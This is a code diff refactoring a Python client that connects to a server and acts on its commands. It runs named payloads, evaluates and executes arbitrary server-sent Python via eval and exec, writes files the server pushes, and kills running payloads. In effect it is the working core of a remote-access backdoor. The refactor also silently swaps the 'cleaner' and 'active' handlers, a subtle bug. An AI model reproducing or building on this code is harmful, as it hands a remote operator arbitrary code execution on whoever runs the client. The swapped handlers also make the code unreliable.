@@ -45,60 +45,88 @@ class PayloadPlayer(Thread):
 
 class Client(Client):
     activePayloads = {}
+    events = {}
     file_buffer = ""
 
+    def event(self, packet_id):
+        def event_decorator(func):
+            self.events[packet_id] = func
+            return func
+        return event_decorator
+
     def handle(self, packet):
-        if packet.get_id() == "execute_list":
-            self.send(Packet("execute", str(list(PAYLOADS.keys()))))
-
-        if packet.get_id() == "execute":
-            try:
-                data = PayloadPlayer(PAYLOADS[packet.read()], self).execute()
-            except KeyError:
-                self.send(Packet("info", "Can not find payload %s."%packet.read()))
-            else:
-                self.send(Packet("info", data))
-
-        if packet.get_id() == "cmd":
-            try:
-                data = eval(packet.read())
-            except Exception as e:
-                data = "%s: %s"%(type(e), e)
-
-            self.send(Packet("info", str(data)))
-
-        if packet.get_id() == "new_file":
-            name = packet.read()
-            self.file_buffer = name
-
-            os.makedirs("." if os.path.dirname(name) == "" else os.path.dirname(name), exist_ok=True)
-            with open(name, "w") as f:
-                f.close()
-
-            self.send(Packet("info", "Recieving file '%s'."%name))
-
-        if packet.get_id() == "file_data":
-            data = packet.read_raw()
-
-            with open(self.file_buffer, "ab") as f:
-                f.write(data)
-                f.close()
-
-        if packet.get_id() == "cleaner":
-            for i in self.activePayloads:
-                self.activePayloads[i].kill()
-
-        if packet.get_id() == "active":
-            self.send(Packet("active", str(self.activePayloads)))
-
-        if packet.get_id() == "paykill":
-            try:
-                self.activePayloads[packet.read()].kill()
-            except KeyError:
-                self.send(Packet("info", "Can not find payload %s."%packet.read()))
-            else:
-                self.send(Packet("info", "Killed payload."))
+        f = lambda x, y: (x, y)
+        self.events.get(packet.get_id(), f)(self, packet)
 
 
-c = Client("localhost", 2000)
-c.start()
+client = Client("localhost", 2000)
+client.start()
+
+
+@client.event("ping")
+def event_ping(client, packet):
+    client.send(Packet("pong"))
+
+@client.event("execute_list")
+def event_execute_list(client, packet):
+    client.send(Packet("execute", str(list(PAYLOADS.keys()))))
+
+@client.event("execute")
+def event_execute(client, packet):
+    try:
+        data = PayloadPlayer(PAYLOADS[packet.read()], client).execute()
+    except KeyError:
+        client.send(Packet("info", "Can not find payload %s."%packet.read()))
+    else:
+        client.send(Packet("info", data))
+
+@client.event("cmd")
+def event_cmd(client, packet):
+    try:
+        data = eval(packet.read())
+        client.send(Packet("info", str(data)))
+    except Exception as e:
+        client.send(Packet("info", str("%s: %s"%(type(e), e))))
+
+    try:
+        exec(packet.read())
+        client.send(Packet("info", str("Run on exec")))
+    except Exception as e:
+        client.send(Packet("info", str("%s: %s"%(type(e), e))))
+
+@client.event("new_file")
+def event_new_file(client, packet):
+    name = packet.read()
+    client.file_buffer = name
+
+    os.makedirs("." if os.path.dirname(name) == "" else os.path.dirname(name), exist_ok=True)
+    with open(name, "w") as f:
+        f.close()
+
+    client.send(Packet("info", "Recieving file '%s'."%name))
+
+@client.event("file_data")
+def event_file_data(client, packet):
+    data = packet.read_raw()
+
+    with open(client.file_buffer, "ab") as f:
+        f.write(data)
+        f.close()
+
+@client.event("cleaner")
+def event_cleaner(client, packet):
+    client.send(Packet("active", str(client.activePayloads)))
+
+@client.event("active")
+def event_active(client, packet):
+    for i in client.activePayloads:
+        client.activePayloads[i].kill()
+
+@client.event("paykill")
+def event_paykill(client, packet):
+    try:
+        client.activePayloads[packet.read()].kill()
+    except KeyError:
+        client.send(Packet("info", "Can not find payload %s."%packet.read()))
+    else:
+        client.send(Packet("info", "Killed payload."))
